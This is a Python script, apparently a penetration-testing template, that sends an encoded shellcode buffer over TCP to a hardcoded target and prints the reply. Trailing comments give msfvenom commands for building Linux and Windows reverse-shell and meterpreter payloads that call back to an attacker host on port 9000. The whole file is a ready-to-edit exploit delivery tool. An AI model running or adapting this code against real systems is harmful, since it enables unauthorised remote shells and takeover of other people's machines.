#!/usr/bin/env python3

import socket
import codecs

# change the payload as necessary
buf =  b""
buf += b"\x29\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xb6\xe9\x39\x6d\x83\xee\xfc\xe2\xf4\x87\x32"
buf += b"\xce\x8e\xe5\xaa\x6a\x07\xb4\x60\xd8\xdd\xd0\x24\xb9"
buf += b"\xfe\xef\x59\x06\xa0\x36\xa0\x40\x94\xde\x29\x91\x65"
buf += b"\x0f\x81\x3b\x6d\xa7\xb5\xb0\x8c\x06\x8f\x69\x3c\xe5"
buf += b"\x5a\x3a\xe4\x57\x24\xb9\x3f\xde\x87\x16\x1e\xde\x81"
buf += b"\x16\x42\xd4\x80\xb0\x8e\xe4\xba\xb0\x8c\x06\xe2\xf4"
buf += b"\xed"

# prepend or append bytes as necessary, e.g. NOP sled (\x90)
payload = b"" + buf + b""

soc = None
try:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	soc.settimeout(1)
	# change the target address and/or port number as necessary
	soc.connect(("192.168.5.10", 1337))
	print("Sending the payload...")
	soc.send(payload)
	print("Payload was sent successfully")
	print("")
	print("Waiting for a response...")
	response = ""
	while True:
		read = soc.recv(1024)
		if not read:
			break
		# change the encoding as necessary
		response += read.decode("UTF-8")
	if len(response) > 0:
		print("----------RESPONSE----------")
		print(response)
		print("----------------------------")
	else:
		print("Response is empty")
except socket.timeout:
	print("Timed out")
except socket.error as ex:
	print(("ERROR: {0}").format(ex))
finally:
	if soc is not None:
		soc.close()

# shell_reverse_tcp - Linux OS
# msfvenom --platform linux -a x86 -e x86/call4_dword_xor -p linux/x86/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff
# msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/shell_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

# meterpreter_reverse_tcp - Linux OS
# msfvenom --platform linux -a x86 -e x86/call4_dword_xor -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python
# msfvenom --platform linux -a x64 -e x64/xor -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 PORT=9000 EXITFUNC=thread -f python

# shell_reverse_tcp - Windows OS
# msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff
# msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python -b \x00\x0a\x0d\xff

# meterpreter_reverse_tcp - Windows OS
# msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python
# msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f python
